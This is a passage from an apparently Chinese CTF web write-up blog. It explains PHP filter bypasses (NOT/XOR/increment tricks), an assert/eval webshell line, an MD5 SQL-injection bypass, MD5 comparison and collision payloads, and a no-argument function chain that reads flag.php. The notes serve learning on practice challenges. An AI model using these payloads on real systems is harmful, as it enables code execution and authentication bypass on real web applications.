class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(*) 基础信息</span><br><span class="line">当前路径: /var/www/html</span><br><span class="line">磁盘列表: /</span><br><span class="line">系统信息: Linux out 5.15.0-161-generic #171-Ubuntu SMP Sat Oct 11 08:17:01 UTC 2025 x86_64</span><br><span class="line">当前用户: www-data</span><br><span class="line">(*) 输入 ashelp 查看本地命令</span><br><span class="line">(www-data:/var/www/html) $ cat /flag              //查都没有</span><br><span class="line">(www-data:/var/www/html) $ ls /</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">readflag</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/var/www/html) $ /readflag       //运行一下它</span><br><span class="line">flag&#123;32337c9d-8e6d-42de-b5d6-791fcd592089&#125;</span><br></pre></td></tr></table></figure><p>知识点：</p><p><strong>1.动态函数调用</strong></p><p>这涉及 PHP 7 的一个核心特性：<strong>动态函数调用</strong>。</p><ul><li><strong>传统写法</strong>：<code>assert(...);</code></li><li><strong>PHP 7 写法</strong>：<code>(&quot;assert&quot;)(...);</code></li></ul><p>在 PHP 7 中，如果你在括号里放一个字符串，后面紧跟着另一个括号，PHP 会把第一个括号里的字符串当成<strong>函数名</strong>去执行。</p><p><strong>2.知识点二（数字字母绕过）</strong></p><p>目标：**绕过 <code>preg_match(&quot;/[A-Za-z0-9]+/&quot;, $code)</code> **</p><hr><h3 id="1-取反绕过-Bitwise-NOT"><a href="#1-取反绕过-Bitwise-NOT" class="headerlink" title="1. 取反绕过 (Bitwise NOT ~)"></a>1. 取反绕过 (Bitwise NOT <code>~</code>)</h3><ul><li><strong>原理：</strong> 在 PHP 中，<code>~</code> 是按位取反运算符。它会将 8 位二进制数的 <code>0</code> 变为 <code>1</code>，<code>1</code> 变为 <code>0</code>。</li><li><strong>计算过程：</strong><ol><li>字母 <code>a</code> 的 ASCII 码是 <code>97</code>，二进制是 <code>01100001</code>。</li><li>对 <code>01100001</code> 取反，得到 <code>10011110</code>。</li><li><code>10011110</code> 转换成十六进制是 <code>0x9E</code>。</li><li><code>0x9E</code> 是一个不可见字符（非字母非数字）。</li></ol></li><li><strong>代码实现：</strong> <code>(~%9E)</code> 在 PHP 执行时，会先把 <code>%9E</code> 这个不可见字符取反，结果回到了二进制 <code>01100001</code>，即字符 <code>a</code>。</li><li><strong>Payload 构造：</strong> 你想构造 <code>phpinfo</code>，就先对 <code>p, h, p, i, n, f, o</code> 每个字母取反，得到一串 <code>%xx</code> 的编码，最后组合成 <code>(~%8F%8E%8F%8D%8C%9A%8B)();</code>。</li></ul><hr><h3 id="2-异或绕过-XOR"><a href="#2-异或绕过-XOR" class="headerlink" title="2. 异或绕过 (XOR ^)"></a>2. 异或绕过 (XOR <code>^</code>)</h3><ul><li><strong>原理：</strong> 异或运算的规则是“相同为 0，不同为 1”。</li><li><strong>计算过程：</strong><ol><li>字符 <code>?</code> 的 ASCII 是 <code>63</code> (<code>00111111</code>)。</li><li>字符 <code>~</code> 的 ASCII 是 <code>126</code> (<code>01111110</code>)。</li><li>执行 <code>00111111 ^ 01111110</code>，结果是 <code>01000001</code>。</li><li><code>01000001</code> 对应的 ASCII 字符是 <code>p</code>。</li></ol></li><li><strong>绕过逻辑：</strong> 虽然 <code>p</code> 是字母，会被正则拦截，但 <code>?</code> 和 <code>~</code> 都是符号，正则允许通过。</li><li><strong>代码实现：</strong> <code>$a = (&quot;?&quot; ^ &quot;~&quot;);</code> 这行代码里没有任何字母数字，但变量 <code>$a</code> 的值变成了 <code>&quot;p&quot;</code>。通过多次异或拼接，可以拼出 <code>system</code> 等函数名。</li></ul><hr><h3 id="3-自增绕过-Increment"><a href="#3-自增绕过-Increment" class="headerlink" title="3. 自增绕过 (Increment ++)"></a>3. 自增绕过 (Increment <code>++</code>)</h3><ul><li><strong>原理：</strong> PHP 继承了 Perl 的特性，支持对字符串进行自增操作。如果你对字符 <code>&#39;a&#39;</code> 执行 <code>++</code>，它会变成 <code>&#39;b&#39;</code>。</li><li><strong>关键知识：</strong><ol><li><strong>如何获得第一个字符？</strong> PHP 中，如果定义一个变量 <code>$a = [];</code>（空数组），当你把它当字符串用时（例如 <code>&quot;$a&quot;</code>），PHP 会强制转换它为字符串 <code>&quot;Array&quot;</code>。</li><li><strong>提取首字母：</strong> <code>$_ = [].&#39;&#39;;</code> 此时 <code>$_</code> 的值是 <code>&quot;Array&quot;</code>。</li><li><strong>获取 ‘A’：</strong> <code>$_ = $_[0];</code>（取字符串第一个字符，即 <code>A</code>）。</li><li><strong>递增：</strong> <code>$__ = $_; $__++;</code>（此时 <code>$__</code> 变成了 <code>B</code>）。</li></ol></li><li><strong>绕过逻辑：</strong> 利用符号（如 <code>[]</code>, <code>.</code>, <code>_</code>）得到一个初始字母，再通过反复自增，凑齐你需要的 <code>s, y, s, t, e, m</code> 等字母。整个过程不涉及任何硬编码的字母。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];          // 定义数组</span><br><span class="line">$_ = $_ . &quot;&quot;;     // 强制转字符串，此时 $_ 是 &quot;Array&quot;</span><br><span class="line">$_ = $_[0];       // 取第一个字符，此时 $_ 是 &quot;A&quot;</span><br><span class="line"></span><br><span class="line">// 如果想要 &#x27;S&#x27; (system 的开头)</span><br><span class="line">$s = $_; </span><br><span class="line">for($i=0; $i&lt;18; $i++)&#123; $s++; &#125; // A 自增 18 次变成 S</span><br><span class="line">echo $s; // 输出 S</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=[];$_=$_.&quot;&quot;;$_=$_[0];$__=$_;$__++;$__++;$__++;......(以此类推)</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>php可变函数</strong></li></ol><p><strong>“可变函数”</strong>： 如果一个变量后面跟着括号，如 <code>$a()</code>，PHP 会寻找名字叫做“变量 <code>$a</code> 的值”的函数并执行。</p><ul><li><strong>步骤 A：</strong> 使用取反&#x2F;异或&#x2F;自增构造出字符串 <code>&quot;system&quot;</code>，存入变量 <code>$_</code>。</li><li><strong>步骤 B：</strong> 使用取反&#x2F;异或&#x2F;自增构造出字符串 <code>&quot;ls /&quot;</code>，存入变量 <code>$__</code>。</li><li><strong>步骤 C：</strong> 执行 <code>$_($__)</code>。这在底层等同于调用 <code>system(&quot;ls /&quot;)</code>。</li></ul><p>易错点：</p><p>正确语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &quot;phpinfo&quot;; </span><br><span class="line">$_();</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8f%97%8f%96%91%99%90)()  //code=&quot;phpinfo&quot;()，明显是个字符串，而字符串后面跟括号语法错误，必须是变量</span><br><span class="line"></span><br><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();  //没有关系，即使code里面得到的只是字符串，无法中eval执行，但是phpinfo本身就是个函数，他可以自己执行</span><br></pre></td></tr></table></figure><p>其实这里产生了一个问题，为什么异或操作后面加上()就可以被当作函数执行呢？</p><p>那是因为异或的写法 <code>(&quot;a&quot;^&quot;b&quot;)()</code> 触发了 PHP 7 的一个“骚操作”补丁，而取反 <code>(~a)()</code> 因为符号优先级问题，经常触发不了这个补丁，导致报错。</p><p>4.<code>assert()</code>：狡猾的“纠错哨兵”</p><p><code>assert</code> 原本是用来做代码调试的（判断某个条件是否成立），但在 PHP 5 和早期 PHP 7 中，它有一个非常危险的特性。</p><ul><li><strong>它的功能</strong>：如果传给它的参数是<strong>字符串</strong>，它会把这个字符串当作 PHP 代码执行。</li></ul><p>**(**assert)(eval($_POST[“test”]))</p><p>5.&#x2F;readflag</p><p><code>/readflag</code> 是一个<strong>编译好的可执行程序</strong>（就像 Windows 里的 <code>.exe</code> 文件）。当你输入 <code>/readflag</code> 并回车时，计算机会执行这个程序内部写死的逻辑：</p><ol><li><strong>程序启动</strong>：它会立刻向 Linux 系统申请“临时 root 权限”。</li><li><strong>寻找文件</strong>：它在代码里已经写好了：“去打开 <code>/flag</code> 这个文件”。</li><li><strong>读取内容</strong>：它把文件里的字符串（即真正的 Flag）读取到内存中。</li><li><strong>打印输出</strong>：它执行类似 <code>printf</code> 或 <code>echo</code> 的指令，把内容吐在你的屏幕上。</li></ol><p><strong>所以，你运行 <code>/readflag</code> 就等同于执行了一套组合拳：</strong></p><blockquote><p>申请权限 -&gt; 找到 flag 文件 -&gt; 读取内容 -&gt; 打印出来。</p></blockquote><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p>题目：</p><p>1.抓包看到有hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>md5($pass,true)：</p><p>true和false</p><p>给个经典的绕过：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符，是true造成的，false就不是乱码了)</p><p>这里的SQL语句会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6XXXXXXXXX&#x27;  </span><br></pre></td></tr></table></figure><p>2.绕过后来到了这里：<strong>GET</strong> &#x2F;levels91.php <strong>HTTP&#x2F;1.1</strong></p><p>看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>发现是md5弱比较绕过，可用科学计数法或者数组</p><p>3.最后来到这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>!==</code>严格要求：值不同，类型不同</p><p>md5的<code>===</code>严格要求：md5编码后的值和类型完全相同</p><p>看起来很矛盾，但是可以用 数组或者强碰撞 来解决</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param1[]=2</span><br></pre></td></tr></table></figure><p>知识点：</p><h3 id="1-md5弱比较绕过"><a href="#1-md5弱比较绕过" class="headerlink" title="1.md5弱比较绕过"></a>1.md5弱比较绕过</h3><p>有一些字符串的MD5值为0e开头，</p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li></ul><p>还有MD5和双MD5以后的值都是0e开头的</p><ul><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li><li>7r4lGXCH2Ksu2JNT3BYM</li></ul><h3 id="2-弱比较绕过"><a href="#2-弱比较绕过" class="headerlink" title="2.弱比较绕过"></a>2.弱比较绕过</h3><h4 id="1-字符串与数字比较"><a href="#1-字符串与数字比较" class="headerlink" title="1.字符串与数字比较"></a>1.字符串与数字比较</h4><p>当一个<strong>数字</strong>和一个<strong>字符串</strong>用 <code>==</code> 比较时，PHP 会尝试把字符串转成数字。</p><ul><li><strong>规则</strong>：PHP 会从字符串的<strong>开头</strong>开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 <code>0</code>。</li><li><strong>例子</strong>：<ul><li><code>123 == &quot;123&quot;</code> → <code>true</code>（很正常）</li><li><code>123 == &quot;123admin&quot;</code> → <code>true</code> （<strong>坑！</strong> PHP 提取了开头的 <code>123</code>，忽略了后面的字母）</li><li><code>0 == &quot;admin&quot;</code> → <code>true</code> （<strong>大坑！</strong> 因为 <code>admin</code> 开头没数字，被转成了 <code>0</code>）</li></ul></li></ul><h4 id="2-布尔值（True-False）"><a href="#2-布尔值（True-False）" class="headerlink" title="2.布尔值（True&#x2F;False）"></a>2.布尔值（True&#x2F;False）</h4><p>这是最危险的一种。如果比较的一方是 <code>true</code>，PHP 会把另一方也转成布尔值。</p><ul><li><strong>规则</strong>：除了 <code>0</code>、空字符串 <code>&quot;&quot;</code>、空数组 <code>[]</code>、<code>null</code> 之外，<strong>几乎所有的东西转成布尔值都是 <code>true</code></strong>。</li><li><strong>例子</strong>：<ul><li><code>true == &quot;any_string&quot;</code> → <code>true</code></li><li><code>true == 123</code> → <code>true</code></li></ul></li><li><strong>应用场景</strong>：如果后端代码写的是 <code>if($password == true)</code>，你随便输入什么字符串都能直接登录。</li></ul><p>PHP 的弱类型比较（<code>==</code>）里的“坑”非常多，除了<strong>科学计数法（0e）</strong>，还有好几种让人哭笑不得的“自作聪明”。</p><p>在 PHP 8.0 之前，这些规则非常混乱，但在 CTF 比赛或旧代码审计中，你经常会遇到以下几种类型：</p><h3 id="1-字符串与数字比较（最常见的坑）"><a href="#1-字符串与数字比较（最常见的坑）" class="headerlink" title="1. 字符串与数字比较（最常见的坑）"></a>1. 字符串与数字比较（最常见的坑）</h3><p>当一个<strong>数字</strong>和一个<strong>字符串</strong>用 <code>==</code> 比较时，PHP 会尝试把字符串转成数字。</p><ul><li><strong>规则</strong>：PHP 会从字符串的<strong>开头</strong>开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 <code>0</code>。</li><li><strong>例子</strong>：<ul><li><code>123 == &quot;123&quot;</code> → <code>true</code>（很正常）</li><li><code>123 == &quot;123admin&quot;</code> → <code>true</code> （<strong>坑！</strong> PHP 提取了开头的 <code>123</code>，忽略了后面的字母）</li><li><code>0 == &quot;admin&quot;</code> → <code>true</code> （<strong>大坑！</strong> 因为 <code>admin</code> 开头没数字，被转成了 <code>0</code>）</li></ul></li></ul><hr><h3 id="2-十六进制字符串转换"><a href="#2-十六进制字符串转换" class="headerlink" title="2. 十六进制字符串转换"></a>2. 十六进制字符串转换</h3><p>在旧版本的 PHP（PHP 5）中，如果字符串看起来像十六进制（以 <code>0x</code> 开头），比较时也会自动转成十进制数字。</p><ul><li><strong>例子</strong>：<code>&quot;0x1e&quot; == &quot;30&quot;</code> → <code>true</code><ul><li>解析：<code>0x1e</code> 是十六进制的 30，PHP 自动帮你在后台转好了。</li><li><em>注：这种特性在 PHP 7 中已被移除，但在老题目中依然会出现。</em></li></ul></li></ul><hr><h3 id="3-布尔值（True-False）的“万能匹配”"><a href="#3-布尔值（True-False）的“万能匹配”" class="headerlink" title="3. 布尔值（True&#x2F;False）的“万能匹配”"></a>3. 布尔值（True&#x2F;False）的“万能匹配”</h3><p>这是最危险的一种。如果比较的一方是 <code>true</code>，PHP 会把另一方也转成布尔值。</p><ul><li><strong>规则</strong>：除了 <code>0</code>、空字符串 <code>&quot;&quot;</code>、空数组 <code>[]</code>、<code>null</code> 之外，<strong>几乎所有的东西转成布尔值都是 <code>true</code></strong>。</li><li><strong>例子</strong>：<ul><li><code>true == &quot;any_string&quot;</code> → <code>true</code></li><li><code>true == 123</code> → <code>true</code></li></ul></li><li><strong>应用场景</strong>：如果后端代码写的是 <code>if($password == true)</code>，你随便输入什么字符串都能直接登录。</li></ul><h4 id="3-数组（Array）的特殊处理"><a href="#3-数组（Array）的特殊处理" class="headerlink" title="3. 数组（Array）的特殊处理"></a>3. 数组（Array）的特殊处理</h4><p>正如我之前提到的，有些函数（比如 <code>md5()</code>）不接受数组。</p><ul><li><strong>情况</strong>：如果你给 <code>md5()</code> 传一个数组，比如 <code>md5([])</code>，PHP 会报一个警告，并返回 <strong><code>null</code></strong>。</li><li><strong>逻辑绕过</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 如果代码是这样：</span><br><span class="line">if (md5($a) == md5($b))</span><br></pre></td></tr></table></figure><p>你传入 <code>a[]=1&amp;b[]=2</code>。 计算结果变成：<code>NULL == NULL</code> → <strong>结果为 <code>true</code></strong>。 这种方法不仅能绕过科学计数法的 <code>0e</code>，甚至能绕过<strong>强类型比较 <code>===</code></strong>。</p><h4 id="4-NULL、0、空字符串"><a href="#4-NULL、0、空字符串" class="headerlink" title="4. NULL、0、空字符串"></a>4. NULL、0、空字符串</h4><p>这三者在 <code>==</code> 下是“三位一体”的。</p><ul><li><code>0 == &quot;&quot;</code> → <code>true</code></li><li><code>0 == &quot;0&quot;</code> → <code>true</code></li><li><code>0 == null</code> → <code>true</code></li><li><code>false == &quot;&quot;</code> → <code>true</code></li></ul><h4 id="5-科学计数法"><a href="#5-科学计数法" class="headerlink" title="5.科学计数法"></a>5.科学计数法</h4><p>当 PHP 执行 <code>if (&quot;0e123&quot; == &quot;0e456&quot;)</code> 时，它的大脑里发生了如下对话：</p><ol><li><strong>PHP</strong>：“左边是一个字符串 <code>0e123</code>，右边是一个字符串 <code>0e456</code>。”</li><li><strong>PHP</strong>：“咦？等等，这两位长得好像科学计数法啊！左边 0×10 的 123 次方是 0，右边 0×10 的 456 次方也是 0。”</li><li><strong>PHP</strong>：“既然它们在数学上都等于数字 0，那它们肯定就是相等的啦！”</li><li><strong>结果</strong>：返回 <code>true</code>。</li></ol><p>3.强比较绕过</p><p>根据有无string看，是否可以数组绕过</p><p><a href="https://blog.csdn.net/m0_73818134/article/details/131793815">https://blog.csdn.net/m0_73818134/article/details/131793815</a></p><p>例子：</p><p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">echo &#x27;You got the first step&#x27;;</span><br><span class="line">if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">if (!is_numeric($passwd)) &#123;</span><br><span class="line">if($passwd==1234567) &#123;</span><br><span class="line">echo &#x27;Good Job!&#x27;;</span><br><span class="line">highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">die(&#x27;By Retr_0&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;can you think twice??&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &#x27;You can not get it !&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Please input first</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-信息收集</title>
      <link href="/posts/6c876023.html"/>
      <url>/posts/6c876023.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-信息收集"><a href="#web-信息收集" class="headerlink" title="web-信息收集"></a>web-信息收集</h2><h2 id="buuctf-禁止套娃"><a href="#buuctf-禁止套娃" class="headerlink" title="buuctf 禁止套娃"></a>buuctf 禁止套娃</h2><p>1.找不到flag，没有思路，dir扫描</p><p>git泄露</p><p><img src="/images/image-20251220213424261.png" alt="image-20251220213424261"></p><p>2.githack工具获取源码</p><p><img src="/images/image-20251220213357128.png" alt="image-20251220213357128"></p><p>3.代码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">    </span><br><span class="line">                   //preg_replace(正则, NULL, $_GET[&#x27;exp&#x27;]) -&gt;把输入中正则部分给删掉</span><br><span class="line">    </span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="R"><a href="#R" class="headerlink" title="(?R)?"></a><code>(?R)?</code></h3><table><thead><tr><th>符号</th><th>大白话含义</th></tr></thead><tbody><tr><td><code>(?R)</code></td><td>「递归引用」：代表<strong>重复使用整个正则表达式的规则</strong>（比如这道题的 <code>/[a-z,_]+\((?R)?\)/</code>）</td></tr><tr><td><code>?</code></td><td>「可选匹配」：代表前面的 <code>(?R)</code> 是 “可有可无” 的（有嵌套也匹配，没嵌套也匹配）</td></tr></tbody></table><p><code>     /[a-z,_]+\((?R)?\)/</code></p><p>​      <code>\(    (?R)?    \)</code>  这里的\是转义</p><p>拆成 ：<code>函数名 + ( + 可选的嵌套函数 + )</code></p><p>![屏幕截图 2025-12-20 212227](&#x2F;images&#x2F;屏幕截图 2025-12-20 212227.png)</p><p>因为不能写参数，就用 “无参数 PHP 函数嵌套”，一步步拼出要读的文件：</p><p><code>var_dump()</code> 能直接打印<strong>数组</strong>以及所有类型的变量 ，</p><p>作用是<strong>把内容打印到页面</strong>，但它本身的返回值是 <code>NULL</code></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><ol><li><p><strong>拿当前目录（<code>.</code>）</strong>：</p><p>用<code>localeconv()</code>（无参数，返回含<code>.</code>的数组）+<code>pos()</code>（无参数，取数组第一个元素<code>.</code>）→ <code>pos(localeconv())</code>；</p></li><li><p><strong>扫目录文件</strong>：用<code>scandir(上面的结果)</code> → 拿到当前目录的文件数组（含<code>flag.php</code>）；</p></li></ol><p><code>scandir()</code> 是这道题里<strong>唯一能 “无参数列出目录文件” 的关键函数</strong>—— 它的本职是 “扫描指定目录，返回该目录下所有文件 &#x2F; 文件夹的数组”</p><p>scandir(.)  :    从 “拿到 <code>.</code>（当前目录）” 到 “找到文件” </p><ol><li><strong>定位 flag.php</strong>：用<code>array_reverse()</code>（反转数组）+<code>next()</code>（取反转后第二个元素）→ 精准拿到<code>flag.php</code>；</li><li><strong>读文件内容</strong>：用<code>highlight_file(上面的结果)</code> → 显示<code>flag.php</code>源码，拿到 flag。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 完整payload拆解（全是无参数函数）</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(          // 第四步：显示文件内容</span><br><span class="line">  <span class="title function_ invoke__">next</span>(                  // 第三步：取反转数组第二个元素（flag.php）</span><br><span class="line">    <span class="title function_ invoke__">array_reverse</span>(       // 第三步：反转目录数组</span><br><span class="line">      <span class="title function_ invoke__">scandir</span>(           // 第二步：扫描当前目录</span><br><span class="line">        <span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())// 第一步：拿到当前目录符号.</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>localeconv()</p><ol><li>它是 PHP 的内置函数，<strong>不用传任何参数</strong>（输入），调用就有返回；</li><li>它返回的结果是一个「数组」（可以理解成 “一堆数据的集合，按顺序排好”），而且这个数组里<strong>第一个数据永远是「.」</strong>。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">localeconv</span>()); <span class="comment">// 打印localeconv()的返回结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 